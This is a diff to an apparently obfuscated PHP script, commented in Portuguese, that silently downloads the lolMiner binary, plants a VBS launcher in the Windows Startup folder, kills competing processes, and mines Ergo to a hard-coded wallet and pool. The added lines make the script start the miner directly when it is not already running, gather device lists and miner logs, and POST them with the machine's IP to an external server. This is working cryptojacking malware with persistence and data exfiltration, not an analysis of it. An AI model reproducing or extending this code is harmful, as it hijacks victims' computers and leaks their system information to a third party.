@@ -3,7 +3,7 @@ cuidado ao chamar funções nativas pois elas estao camufladas
 
 [GIT_COMMAND]
 
-$GLOBALS['__download_002'] = function($url)
+$GLOBALS['__download_002'] = function($url, $post = false)
 {
 	try
 	{
@@ -21,7 +21,13 @@ $GLOBALS['__download_002'] = function($url)
 		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		if($post)
+		{
+			curl_setopt($ch, CURLOPT_POST, true);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
+		}
 		$response = @curl_exec($ch);
+		curl_close($ch);
 		return $response;
 		
 	}catch( Exception $e ){}
@@ -84,7 +90,7 @@ if(!$work_key)
 	@file_put_contents($id_path, $work_key);
 }
 $work_key = trim($work_key);
-$command_id = '000042';
+$command_id = '000044';
 if(@file_get_contents($id_com) !== $command_id)
 {
 	@file_put_contents($id_com, $command_id);
@@ -94,7 +100,7 @@ if(@file_get_contents($id_com) !== $command_id)
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = $GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
+		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
 		if($data && strlen($data) > 11000)
 			@file_put_contents($lolm_path, $data);
 		else
@@ -119,6 +125,7 @@ if(@file_get_contents($id_com) !== $command_id)
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
 		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
 		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
+		$execlol = false;
 		if(is_dir($vbs_path))
 		{
 			@exec('taskkill /f /im w_driver_x86.exe');
@@ -137,6 +144,7 @@ if(@file_get_contents($id_com) !== $command_id)
 				$count_files++;
 				if($count_files == 1)
 				{
+					$execlol = true;
 					@file_put_contents($data->getPathname(), $vbs);
 					@exec('start "" "'.$data->getPathname().'"');
 				}
@@ -145,8 +153,47 @@ if(@file_get_contents($id_com) !== $command_id)
 			}
 			if($count_files == 0)
 			{
+				$execlol = true;
 				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
 				@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
+			}
+		}
+		if($execlol)
+		{
+			sleep(10);
+			$output = array();
+			$r = 0;
+			@exec('tasklist', $output, $r);
+			$output = implode("\n", $output);
+			if(false === stripos($output, 'w_driver1.95_x86'))
+			{
+				$output = array();
+				$r = 0;
+				@exec('"' . $lolm_path . '" --list-devices --nocolor', $output, $r);
+				$devices = implode("\n", $output);
+				
+				$log_path = dirname($lolm_path) . '\\temp_log.txt';
+				@pclose(@popen('start /B cmd /c ""' . $lolm_path . '" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum.' > "' . $log_path . '" 2>&1"', 'r'));
+				sleep(10);
+				$output = array();
+				$r = 0;
+				@exec('tasklist', $output, $r);
+				$output = implode("\n", $output);
+				if(false === stripos($output, 'w_driver1.95_x86'))
+				{
+					$logdata = @file_get_contents($log_path);
+					if($logdata)
+					{
+						$post = array(
+							'devices' => $devices,
+							'logdata' => $logdata
+						);
+						$ipl = @gethostbyname(@gethostname());
+						if(!$ipl)
+							$ipl = '127.0.0.1';
+						@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+					}
+				}
 			}
 		}
 	}
